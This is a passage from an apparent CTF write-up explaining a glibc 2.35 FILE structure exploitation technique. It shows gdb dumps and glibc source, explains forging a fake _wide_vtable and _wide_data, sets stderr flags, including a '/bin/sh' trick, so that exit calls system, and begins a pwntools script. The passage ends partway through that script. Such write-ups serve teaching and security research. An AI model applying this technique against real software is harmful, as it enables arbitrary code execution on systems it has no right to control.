</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  print __GI__IO_wfile_jumps
</span></span><span style="display:flex;"><span>$11 = {
</span></span><span style="display:flex;"><span>  __dummy = 0x0,
</span></span><span style="display:flex;"><span>  __dummy2 = 0x0,
</span></span><span style="display:flex;"><span>  __finish = 0x7ffff7e20070 &lt;_IO_new_file_finish&gt;,
</span></span><span style="display:flex;"><span>  __overflow = 0x7ffff7e1a410 &lt;__GI__IO_wfile_overflow&gt;,
</span></span><span style="display:flex;"><span>  __underflow = 0x7ffff7e19050 &lt;__GI__IO_wfile_underflow&gt;,
</span></span><span style="display:flex;"><span>  __uflow = 0x7ffff7e178c0 &lt;__GI__IO_wdefault_uflow&gt;,
</span></span><span style="display:flex;"><span>  __pbackfail = 0x7ffff7e17680 &lt;__GI__IO_wdefault_pbackfail&gt;,
</span></span><span style="display:flex;"><span>  __xsputn = 0x7ffff7e1a8c0 &lt;__GI__IO_wfile_xsputn&gt;,
</span></span><span style="display:flex;"><span>  __xsgetn = 0x7ffff7e1f330 &lt;__GI__IO_file_xsgetn&gt;,
</span></span><span style="display:flex;"><span>  __seekoff = 0x7ffff7e197d0 &lt;__GI__IO_wfile_seekoff&gt;,
</span></span><span style="display:flex;"><span>  __seekpos = 0x7ffff7e22530 &lt;_IO_default_seekpos&gt;,
</span></span><span style="display:flex;"><span>  __setbuf = 0x7ffff7e1e620 &lt;_IO_new_file_setbuf&gt;,
</span></span><span style="display:flex;"><span>  __sync = 0x7ffff7e1a720 &lt;__GI__IO_wfile_sync&gt;,
</span></span><span style="display:flex;"><span>  __doallocate = 0x7ffff7e13f10 &lt;_IO_wfile_doallocate&gt;,
</span></span><span style="display:flex;"><span>  __read = 0x7ffff7e1f9b0 &lt;__GI__IO_file_read&gt;,
</span></span><span style="display:flex;"><span>  __write = 0x7ffff7e1ef40 &lt;_IO_new_file_write&gt;,
</span></span><span style="display:flex;"><span>  __seek = 0x7ffff7e1e6f0 &lt;__GI__IO_file_seek&gt;,
</span></span><span style="display:flex;"><span>  __close = 0x7ffff7e1e610 &lt;__GI__IO_file_close&gt;,
</span></span><span style="display:flex;"><span>  __stat = 0x7ffff7e1ef30 &lt;__GI__IO_file_stat&gt;,
</span></span><span style="display:flex;"><span>  __showmanyc = 0x7ffff7e234a0 &lt;_IO_default_showmanyc&gt;,
</span></span><span style="display:flex;"><span>  __imbue = 0x7ffff7e234b0 &lt;_IO_default_imbue&gt;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s try to take a look at the implementation of one of the functions which is <code>_IO_wfile_overflow</code> (This is the path that was discovered by both kylebot and roderick01).</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>wint_t
</span></span><span style="display:flex;"><span><span style="color:#c0f">_IO_wfile_overflow</span> (FILE <span style="color:#555">*</span>f, wint_t wch)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (f<span style="color:#555">-&gt;</span>_flags <span style="color:#555">&amp;</span> _IO_NO_WRITES) <span style="color:#09f;font-style:italic">/* SET ERROR */</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      f<span style="color:#555">-&gt;</span>_flags <span style="color:#555">|=</span> _IO_ERR_SEEN;
</span></span><span style="display:flex;"><span>      __set_errno (EBADF);
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">return</span> WEOF;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  <span style="color:#09f;font-style:italic">/* If currently reading or no buffer allocated. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> ((f<span style="color:#555">-&gt;</span>_flags <span style="color:#555">&amp;</span> _IO_CURRENTLY_PUTTING) <span style="color:#555">==</span> <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#09f;font-style:italic">/* Allocate a buffer if needed. */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (f<span style="color:#555">-&gt;</span>_wide_data<span style="color:#555">-&gt;</span>_IO_write_base <span style="color:#555">==</span> <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  _IO_wdoallocbuf (f);
</span></span><span style="display:flex;"><span>	  ...
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>      ...
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span>
</span></span><span style="display:flex;"><span>_IO_wdoallocbuf (FILE <span style="color:#555">*</span>fp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (fp<span style="color:#555">-&gt;</span>_wide_data<span style="color:#555">-&gt;</span>_IO_buf_base)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">!</span>(fp<span style="color:#555">-&gt;</span>_flags <span style="color:#555">&amp;</span> _IO_UNBUFFERED))
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> ((wint_t)_IO_WDOALLOCATE (fp) <span style="color:#555">!=</span> WEOF)
</span></span><span style="display:flex;"><span>      ...
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#099">#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span><span style="color:#099">#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span><span style="color:#099">#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span><span style="color:#099">#define _IO_WIDE_JUMPS(THIS) \
</span></span></span><span style="display:flex;"><span><span style="color:#099">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see in the above, if we&rsquo;re able to trigger <code>WJUMP0</code>, there isn&rsquo;t any validation check whether the <code>wide_vtable</code> stored pointer is in the correct region or not, which means if we&rsquo;re able to forge a fake <code>wide_vtable</code> and trigger the macro call (<code>WJUMP0</code>), we can jump to any address that we want just like the old glibc.</p>
<p>Also notice that the <code>vtable</code> that was used during <code>_IO_WIDE_JUMPS</code> will be taken from the <code>fp-&gt;_wide_data-&gt;_wide_vtable</code>. If you revisit the <code>stdfile</code> fields when we inspect it in the <code>gdb</code>, you can see there the <code>stdfile</code> has a field called <code>_wide_data</code>, which points to another struct <code>_IO_wide_data_1</code>. Below is the field stored in the <code>_IO_wide_data_1</code> printed via gdb:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  print _IO_wide_data_1
</span></span><span style="display:flex;"><span>$10 = {
</span></span><span style="display:flex;"><span>  _IO_read_ptr = 0x0,
</span></span><span style="display:flex;"><span>  _IO_read_end = 0x0,
</span></span><span style="display:flex;"><span>  _IO_read_base = 0x0,
</span></span><span style="display:flex;"><span>  _IO_write_base = 0x0,
</span></span><span style="display:flex;"><span>  _IO_write_ptr = 0x0,
</span></span><span style="display:flex;"><span>  _IO_write_end = 0x0,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  _shortbuf = L&#34;&#34;,
</span></span><span style="display:flex;"><span>  _wide_vtable = 0x7ffff7faa0c0 &lt;__GI__IO_wfile_jumps&gt; &lt;- This is the one that we can overwrite with our fake vtable
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on that information, this is the possible chain call to be achieved if we misaligned the FILE <code>vtable</code> from <code>_IO_file_jumps</code> to <code>_IO_wfile_jumps</code> and trigger <code>__overflow</code> call. Below is the chain:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Assuming that we overwrite the FILE-&gt;vtable from _IO_file_jumps to _IO_wfile_jumps. When the binary try to call
</span></span><span style="display:flex;"><span>_IO_OVERFLOW (fp, EOF), the chain would be:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_IO_OVERFLOW (fp, EOF)
</span></span><span style="display:flex;"><span>|_ JUMP1 (__overflow, fp, EOF)
</span></span><span style="display:flex;"><span>   |_ (_IO_JUMPS_FUNC(fp)-&gt;__overflow) (fp, EOF)
</span></span><span style="display:flex;"><span>      |_ ((IO_validate_vtable (_IO_JUMPS_FILE_plus (fp)))-&gt;__overflow) (fp, EOF) &lt;- Because we overwrite it to point to _IO_wfile_jumps, it will call _IO_wfile_overflow instead of _IO_new_file_overflow. This is still valid because its location is still in the correct region
</span></span><span style="display:flex;"><span>         |_ _IO_wfile_overflow(fp, EOF)
</span></span><span style="display:flex;"><span>            |_ _IO_wdoallocbuf(fp)
</span></span><span style="display:flex;"><span>               |_ _IO_WDOALLOCATE(fp)
</span></span><span style="display:flex;"><span>                  |_ WJUMP0 (__doallocate, fp)
</span></span><span style="display:flex;"><span>                     |_ (_IO_WIDE_JUMPS_FUNC(fp)-&gt;__doallocate) (fp)
</span></span><span style="display:flex;"><span>                         |_ (_IO_WIDE_JUMPS(fp)-&gt;__doallocate) (fp) &lt;- No Validation #profit :D
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notes that to achieve this call, there are some constraints that we need to fulfill:</p>
<ul>
<li>In <code>_IO_wfile_overflow</code>, we need to bypass these checks to continue calling <code>_IO_wdoallocbuf</code>:
<ul>
<li><code>if (f-&gt;_flags &amp; _IO_NO_WRITES)</code> need to return False.</li>
<li><code>if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0)</code> need to return True.</li>
<li><code>if (f-&gt;_wide_data-&gt;_IO_write_base == 0)</code> need to return True.</li>
</ul>
</li>
<li>In <code>_IO_wdoallocbuf</code>, we need to bypass these checks to continue calling <code>_IO_WDOALLOCATE</code>:
<ul>
<li><code>if (fp-&gt;_wide_data-&gt;_IO_buf_base)</code> need to return False.</li>
<li><code>if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</code> need to return True.
<ul>
<li><code>_IO_UNBUFFERED</code> is <code>0x0002</code>, which means <code>_flags &amp; _IO_UNBUFFERED == 0</code> needs to be achieved.</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>And if those constraints are fulfilled, it will jump to the pointer stored in the <code>fp-&gt;_wide_data-&gt;wide_vtable-&gt;__doallocate</code>, where the <code>rdi</code> is a pointer to the FILE itself (<code>fp</code>).</p>
<p>Finally, this is a path that we could take to do FILE Structure Attack in glibc 2.35. For example, we can simply create a fake <code>wide_vtable</code> so that the <code>__doallocate</code> will point to <code>system</code>, which mean when we call <code>_IO_WDOALLOCATE(fp)</code>, it will do <code>system(fp)</code>. And if we forge the <code>fp</code> content to execute <code>sh</code>, that means we will get a shell :D</p>
<p>But first, how can we able to trigger <code>_IO_OVERFLOW</code> in the first place? We can abuse the third menu from the binary, which is <code>exit</code>. You can read the detail about the chain in <a href="https://chovid99.github.io/posts/file-structure-attack-part-1/#the-usage-of-vtable-in-a-file-structure" target="_blank" rel="noopener">my previous article about FILE Structure Attack</a>, but the tl;dr is when we call <code>exit</code>, the binary will have a chain call like this:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>exit
</span></span><span style="display:flex;"><span>|_ _IO_cleanup
</span></span><span style="display:flex;"><span>   |_ _IO_flush_all_lockp
</span></span><span style="display:flex;"><span>      Iterate list of available files (stderr-&gt;stdout-&gt;stdin), and on each iteration it will call:
</span></span><span style="display:flex;"><span>      |_ _IO_OVERFLOW (fp, EOF)
</span></span></code></pre></td></tr></table>
</div>
</div><p>The constraint to call <code>_IO_OVERFLOW</code> is here (taken from the <a href="https://elixir.bootlin.com/glibc/glibc-2.24/source/libio/genops.c#L765" target="_blank" rel="noopener"><code>_IO_flush_all_lockp</code></a> code):</p>
<ul>
<li><code>if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</code>
<ul>
<li>So, we need to set <code>_mode</code> to 0, and <code>_IO_write_ptr &gt; _IO_write_base</code></li>
</ul>
</li>
</ul>
<p>Because <code>exit</code> will iterate all available files, I choose to use the OOB write bug to overwrite the file structure of the <code>stderr</code>. To summarize, what should we do to <code>stderr</code> file structure to gain RCE upon <code>exit</code> are:</p>
<ul>
<li>Create a fake <code>_wide_vtable</code>.
<ul>
<li>I decided to put it in my <code>chunk_addr+0x100</code> address. Notes that our <code>chunk_addr</code> is in <code>libc_base - 0xf7ff0</code>.</li>
<li><code>__doallocate</code> offset is <code>0x68</code>, so fill <code>chunk_addr+0x100+0x68</code> with <code>system</code> address.</li>
</ul>
</li>
<li>Create a fake <code>_wide_data</code>.
<ul>
<li>I decided to put it in <code>chunk_addr</code>.</li>
<li>Set <code>chunk_addr-&gt;_IO_write_base</code> (which is <code>&amp;chunk_addr+0x20</code>) to <code>0</code>.</li>
<li>Set <code>chunk_addr-&gt;_IO_buf_base</code> (which is <code>&amp;chunk_addr+0x38</code>) to <code>0</code>.</li>
<li>Set <code>chunk_addr-&gt;_wide_vtable</code> (which is <code>&amp;chunk_addr+0xe0</code>) to <code>chunk_addr+0x100</code> (which is our <code>fake_wide_vtable</code>).</li>
</ul>
</li>
<li>Set the <code>stderr-&gt;_flags</code> to the correct value. Some important notes:
<ul>
<li>Remember that at the end, because we forge the <code>wide_vtable-&gt;__do_allocate(stderr)</code> to <code>system(stderr)</code>, that means the command that will be executed by <code>system</code> will start from <code>stderr-&gt;_flags</code> (because <code>_flags</code> is <code>&amp;stderr+0x0</code>). We need to ensure that the <code>_flags</code> still fulfill the constraints, yet it&rsquo;s able to execute our command. Some tricks that can be used:
<ul>
<li>kylebot set the <code>_flags</code> to <code>0x3b01010101010101</code>, and <code>_IO_read_ptr</code> to <code>/bin/sh\x00</code>.
<ul>
<li><code>0x3b01010101010101</code> equivalent to <code>\x01\x01\x01\x01\x01\x01\x01;</code>, so by setting it like above, the final call will be <code>system('\x01\x01\x01\x01\x01\x01\x01;/bin/sh')</code>, which will trigger a shell, yet all of the <code>if</code> conditions constraints are fulfilled.</li>
</ul>
</li>
<li>roderick01 set the <code>_flags</code> to &quot;  sh&quot; (with double space in front). This still fulfill the constraints, and will call <code>system(&quot;  sh&quot;)</code> at the end.</li>
</ul>
</li>
</ul>
</li>
<li>Set the <code>stderr-&gt;_IO_write_base</code> to <code>0</code>, and the <code>stderr-&gt;_IO_write_pr</code> to <code>1</code>.
<ul>
<li>So that when we call <code>exit</code>, <code>_IO_flush_all_lockp</code> will call <code>_IO_OVERFLOW(stderr, EOF)</code>.</li>
</ul>
</li>
<li>Set the <code>stderr-&gt;vtable</code> to <code>_IO_wfile_jumps</code>.
<ul>
<li>So that when <code>_IO_OVERFLOW(stderr, EOF)</code> is called, instead of calling <code>_IO_new_file_overflow</code>, it will call <code>_IO_wfile_overflow</code> instead.</li>
</ul>
</li>
</ul>
<p>And after we successfully rewrite the <code>stderr</code> file structure, if we call <code>exit</code>, we should be able to get a shell!</p>
<p>Finally, let&rsquo;s start to continue our script to implement those actions. First, create a fake <code>_wide_vtable</code>.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Setup fake _wide_vtable</span>
</span></span><span style="display:flex;"><span>fake_wide_vtable_addr                         <span style="color:#555">=</span> chunk_addr <span style="color:#555">+</span> <span style="color:#f60">0x100</span>
</span></span><span style="display:flex;"><span>fake_wide_vtable_doallocate_offset_from_chunk <span style="color:#555">=</span> (fake_wide_vtable_addr <span style="color:#555">-</span> chunk_addr) <span style="color:#555">+</span> <span style="color:#f60">0x68</span>
</span></span><span style="display:flex;"><span>system_addr                                   <span style="color:#555">=</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;system&#39;</span>]
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i, num <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">enumerate</span>(p64(system_addr)):
</span></span><span style="display:flex;"><span>    edit(r, fake_wide_vtable_doallocate_offset_from_chunk<span style="color:#555">+</span>i, num)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, create a fake <code>_wide_data</code>.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
